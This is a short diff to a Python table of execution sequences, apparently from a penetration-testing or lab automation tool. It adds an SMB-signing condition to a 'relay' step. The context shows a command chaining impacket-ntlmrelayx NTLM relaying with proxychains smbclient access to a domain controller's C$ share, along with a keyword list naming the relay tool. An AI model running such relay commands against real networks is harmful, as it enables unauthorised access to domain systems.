@@ -2052,6 +2052,7 @@ EXEC_SEQUENCES: dict[str, list[dict]] = {
             "step": "relay",
             "tool": "",
             "tool_hint": "impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -socks && proxychains smbclient //$LAB_TARGET_DC/C$",
+            "condition": {"field": "smb_signing_disabled", "equals": True},
             "keywords": [
                 "ntlmrelayx",
                 "relay",
